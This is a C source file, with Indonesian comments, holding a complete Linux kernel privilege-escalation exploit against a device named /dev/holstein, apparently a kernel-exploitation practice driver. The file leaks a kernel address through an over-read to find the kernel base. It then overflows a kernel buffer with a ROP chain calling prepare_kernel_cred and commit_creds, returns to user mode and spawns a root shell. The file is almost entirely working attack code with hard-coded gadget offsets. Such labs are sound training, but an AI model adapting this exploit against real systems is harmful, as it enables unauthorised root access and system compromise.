#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long kbase,vfs_read;
#define prepare_kernel_cred (kbase + 0x6e240)
#define commit_creds        (kbase + 0x6e390)
#define pop_rdi               (kbase + 0x27bbdc)
#define pop_rcx               (kbase + 0x32cdd3)
#define mov_rdi_rax_rep_movsq (kbase + 0x60c96b)
#define swapgs           (kbase + 0x800e26)
int global_fd;


void fatal(const char *msg) {
  perror(msg);
  exit(1);
}
static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] ROOOT!");
  execve("/bin/sh", argv, envp);
}
void save_state()
{
  asm(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_rsp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
}

void leak()
{
  global_fd = open("/dev/holstein",O_RDWR);
  if(global_fd == -1){
    fatal("open(holstein)");
  }else{
    puts("/dev/holstein terbuka");
  }

  //membocorkan kernel base
  printf("[*] tahap pertama, leaked\n");
  char buff[0x500];
  memset(buff,'A',0x480);
  read(global_fd,buff,0x410);

  for(int i=0;i < 0x480; i++){
    //printf("[*]leaked = 0x%016lx\n",*(unsigned long*)(buff + i * 8) & 0xfff);
     if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x33c){
      vfs_read = *(unsigned long*)(buff + i * 8);
      break;
    }
  }
  kbase = vfs_read - (0xffffffff8113d33c - 0xffffffff81000000);

  printf("[+] vfs_read: 0x%016lx\n" ,vfs_read);
  printf("[+] kernel base: 0x%016lx\n" ,kbase);
  printf("[+] swapgs: 0x%016lx\n" ,swapgs);
  printf("[+] pop rdi: 0x%016lx\n" ,pop_rdi);
  printf("[+] pop rcx: 0x%016lx\n" ,pop_rcx);
  printf("[+] mov_rdi_rax: 0x%016lx\n" ,mov_rdi_rax_rep_movsq);
  printf("[+] commit creds: 0x%016lx\n" ,commit_creds);
  printf("[+] prepare kernel cred: 0x%016lx\n" ,prepare_kernel_cred);

}

void ROP()
{
  printf("tahap kedua, ROP\n");
  char buff[0x500];
  memset(buff,'B',0x408);
  unsigned long *chain = (unsigned long*)&buff[0x408];
  *chain++ = pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx;
  *chain++ = 0;
  *chain++ = mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = swapgs;
  *chain++ = 0xdeadbeef; //rdi
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win; //[rdi+0x10]
  *chain++ = user_cs;             //[rdi+0x18]
  *chain++ = user_rflags;         //[rdi+0x20]
  *chain++ = user_rsp;            //[rdi+0x28]
  *chain++ = user_ss;             //[rdi+0x30]
  write(global_fd,buff,(void*)chain-(void*)buff);
}

int main()
{
  save_state();
  leak();
  ROP();
  
  close(global_fd);

  return EXIT_SUCCESS;
}
